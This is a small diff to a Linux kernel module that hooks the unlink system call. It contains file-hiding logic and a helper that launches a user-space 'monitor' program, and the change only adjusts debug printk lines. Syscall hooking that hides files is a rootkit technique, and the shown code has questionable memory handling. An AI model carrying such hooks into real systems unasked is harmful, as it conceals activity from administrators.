@@ -181,7 +181,6 @@ asmlinkage long hooked_unlink(const char __user *filename){
     int i, j;
     char *value;
     
-    printk("unlink %s %d\n", filename, moni_unlink);
     //Hide a new type of file
     if(strncmp(filename, INEXISTFILE, strlen(INEXISTFILE)) == 0){
         value = (char*) vmalloc(strlen(INEXISTFILE) * sizeof(char*));
@@ -242,7 +241,7 @@ static void lkm_exit(void)
 
 static int callMonitor(char *type, const char *msg){
     if(monitor == NULL) return -1;
-    printk("call = [%s] [%s]\n", type, msg);
+    printk("call = [%s] [%s] [%s]\n", type, msg, monitor);
     char *argv[] = { monitor, type, msg, NULL};
     static char *envp[] = {
             "HOME=/",
